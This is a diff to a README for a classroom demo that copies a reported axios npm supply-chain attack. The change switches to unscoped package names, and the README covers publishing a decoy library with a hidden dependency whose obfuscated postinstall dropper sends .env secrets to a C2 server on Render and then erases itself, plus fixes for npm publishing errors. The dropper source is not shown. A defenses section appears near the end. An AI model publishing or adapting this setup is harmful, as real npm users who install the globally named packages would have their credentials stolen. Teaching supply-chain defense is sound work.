@@ -6,10 +6,18 @@ This demo replicates the **March 31, 2026 axios supply chain attack** on the rea
 
 | Package | Role | Mirrors |
 |---------|------|---------|
-| `@yourname/csec-form-helpers` | Legitimate-looking form validation library | `axios` (the trusted package) |
-| `@yourname/csec-crypto-utils` | Hidden dependency with obfuscated postinstall dropper | `plain-crypto-js` (the malicious dependency) |
+| `csec-form-helpers` (default) or `@yourscope/csec-form-helpers` | Legitimate-looking form validation library | `axios` (the trusted package) |
+| `csec-crypto-utils` or `@yourscope/csec-crypto-utils` | Hidden dependency with obfuscated postinstall dropper | `plain-crypto-js` (the malicious dependency) |
 
-The victim runs `npm install @yourname/csec-form-helpers` — npm resolves the hidden dependency, the obfuscated `postinstall` hook runs silently, exfiltrates `.env` secrets to your C2 server, then **erases itself** leaving no forensic trace.
+**Scoped vs unscoped:** The repo defaults to **unscoped** names (`csec-form-helpers`, `csec-crypto-utils`). Victims run:
+
+```bash
+npm install csec-form-helpers
+```
+
+Unscoped names are **global** on npm — if the name is already taken, publishing fails; use a unique name in `package.json` or switch to **scoped** packages (`@yourname/...` in `package.json`; `publish.sh` still patches `@yourname` to your logged-in user when present).
+
+The victim install pulls the hidden dependency, the obfuscated `postinstall` hook runs silently, exfiltrates `.env` secrets to your C2 server, then **erases itself** leaving no forensic trace.
 
 ---
 
@@ -65,7 +73,7 @@ Visit `https://csec-c2-server.onrender.com` in your browser — the live dashboa
 
 **Step 5: Verify on npmjs.com**
 
-Open `https://www.npmjs.com/package/@yourname/csec-form-helpers` — looks like a normal form validation package.
+Open `https://www.npmjs.com/package/csec-form-helpers` — looks like a normal form validation package (use your actual package name if scoped).
 
 ---
 
@@ -102,7 +110,7 @@ node server.js
 
 **Step 4: Verify on npmjs.com**
 
-Open `https://www.npmjs.com/package/@yourname/csec-form-helpers` in a browser. It looks like a completely normal form validation package. The dependency on `@yourname/csec-crypto-utils` is listed but looks harmless.
+Open `https://www.npmjs.com/package/csec-form-helpers` in a browser. It looks like a completely normal form validation package. The dependency on `csec-crypto-utils` is listed but looks harmless.
 
 ---
 
@@ -135,7 +143,7 @@ EOF
 > "I found a form validation library on npm. Looks good — let me install it."
 
 ```bash
-npm install @yourname/csec-form-helpers
+npm install csec-form-helpers
 ```
 
 **Point out:** The npm output looks completely normal. No warnings. No errors.
@@ -144,7 +152,7 @@ npm install @yourname/csec-form-helpers
 
 ```bash
 node -e "
-const { validateEmail, validatePassword } = require('@yourname/csec-form-helpers');
+const { validateEmail, validatePassword } = require('csec-form-helpers');
 console.log('Email valid:', validateEmail('user@corp.com'));
 console.log('Password:', validatePassword('Test@1234'));
 "
@@ -169,11 +177,11 @@ All the victim's secrets are displayed:
 
 ```bash
 # Check node_modules — the package works fine
-ls node_modules/@yourname/csec-form-helpers/
+ls node_modules/csec-form-helpers/
 # index.js, package.json — nothing suspicious
 
 # Check the hidden dependency
-ls node_modules/@yourname/csec-crypto-utils/
+ls node_modules/csec-crypto-utils/
 # index.js, package.json — also looks clean!
 # No setup.js. No postinstall hook in package.json.
 # The dropper ERASED ITSELF after running.
@@ -218,7 +226,7 @@ Walk through each step the deobfuscate script shows:
 1. **`npm install --ignore-scripts`** — blocks postinstall hooks entirely
 2. **Lockfiles + `npm ci`** — committed lockfile prevents pulling unexpected versions
 3. **Socket.dev / Snyk** — flags suspicious postinstall behavior (Socket detected the real attack in 6 minutes)
-4. **Audit before installing** — `npm info @yourname/csec-form-helpers` shows the dependency
+4. **Audit before installing** — `npm info csec-form-helpers` shows the dependency
 5. **Never store raw secrets in `.env`** — use vaults (AWS Secrets Manager, HashiCorp Vault)
 6. **MFA on npm accounts** — the real attack started with a hijacked maintainer account
 7. **Short-lived tokens / OIDC publishing** — no long-lived npm access tokens
@@ -234,7 +242,15 @@ cd demos/token-stealer/npm-publish
 ./unpublish.sh
 ```
 
-This removes both `@yourname/csec-form-helpers` and `@yourname/csec-crypto-utils` from the public registry.
+This removes both packages listed in `csec-form-helpers/package.json` and `csec-crypto-utils/package.json` from the public registry (unscoped or scoped, depending on what you published).
+
+**Legacy scoped packages** (e.g. you published `@dany47/csec-form-helpers` earlier, then switched the repo to unscoped names): those **stay on npm** until you remove them explicitly. Unpublish **the main package first** (it depends on the hidden one), then the crypto package:
+
+```bash
+./unpublish.sh @dany47/csec-form-helpers @dany47/csec-crypto-utils
+```
+
+(Replace `dany47` with your scope.)
 
 ---
 
@@ -243,7 +259,7 @@ This removes both `@yourname/csec-form-helpers` and `@yourname/csec-crypto-utils
 | File | Role |
 |------|------|
 | `csec-form-helpers/index.js` | Clean form validation code (the cover) |
-| `csec-form-helpers/package.json` | Depends on `@yourname/csec-crypto-utils` (the hidden chain) |
+| `csec-form-helpers/package.json` | Depends on `csec-crypto-utils` (the hidden chain) |
 | `csec-crypto-utils/index.js` | Benign crypto helpers (another cover) |
 | `csec-crypto-utils/package.json` | Has `postinstall: node setup.js` (the trigger) |
 | `csec-crypto-utils/setup.js` | **THE OBFUSCATED DROPPER** (generated by build script) |
@@ -260,8 +276,8 @@ This removes both `@yourname/csec-form-helpers` and `@yourname/csec-crypto-utils
 
 | Axios Attack (March 31, 2026) | This Demo |
 |-------------------------------|-----------|
-| `axios@1.14.1` (trusted, 100M downloads) | `@yourname/csec-form-helpers` |
-| `plain-crypto-js@4.2.1` (hidden dependency) | `@yourname/csec-crypto-utils` |
+| `axios@1.14.1` (trusted, 100M downloads) | `csec-form-helpers` |
+| `plain-crypto-js@4.2.1` (hidden dependency) | `csec-crypto-utils` |
 | `setup.js` postinstall dropper | `setup.js` postinstall dropper |
 | Reversed Base64 + XOR (key: `OrDeR_7077`, const: `333`) | Same obfuscation, same key, same constant |
 | Self-deletion + package.json swap | Self-deletion + package.md swap |
@@ -276,10 +292,11 @@ This removes both `@yourname/csec-form-helpers` and `@yourname/csec-crypto-utils
 | Problem | Fix |
 |---------|-----|
 | `npm ERR! 402` on publish | Scoped packages need `--access public` (already in publish.sh) |
-| `npm ERR! 403` on publish | Package name may be taken. Change the name in package.json files |
+| `npm ERR! 403` — 2FA required | npm now requires **two-factor authentication** on your account, or a **granular access token** with publish permission. Go to [npmjs.com](https://www.npmjs.com) → Access Tokens → Generate New Token (Granular) → allow **Publish** for your scope, then `npm login` with that token, or enable 2FA and run `npm publish` again (enter OTP when prompted). |
+| `npm ERR! 403` (other) | Package name may be taken or you lack access. Change the name in package.json files |
 | Victim can't reach C2 (local) | Check firewall: `sudo ufw allow 4444`. Both must be on same network |
 | Victim can't reach C2 (Render) | Ensure the Render service is running (not spun down). Free tier spins down after inactivity — visit the dashboard URL to wake it |
 | Render service won't start | Check Render logs. The C2 server uses `PORT` env var which Render sets automatically |
-| Self-deletion didn't work | The `setup.js` `__dirname` may differ in some npm versions. Check `node_modules/@yourname/csec-crypto-utils/` |
+| Self-deletion didn't work | The `setup.js` `__dirname` may differ in some npm versions. Check `node_modules/csec-crypto-utils/` |
 | Unpublish fails | npm has a 72-hour unpublish window for packages with no dependents. After that, contact npm support |
 | HTTPS errors in payload | Make sure you passed the full URL with `https://` to publish.sh. The payload auto-selects http vs https |
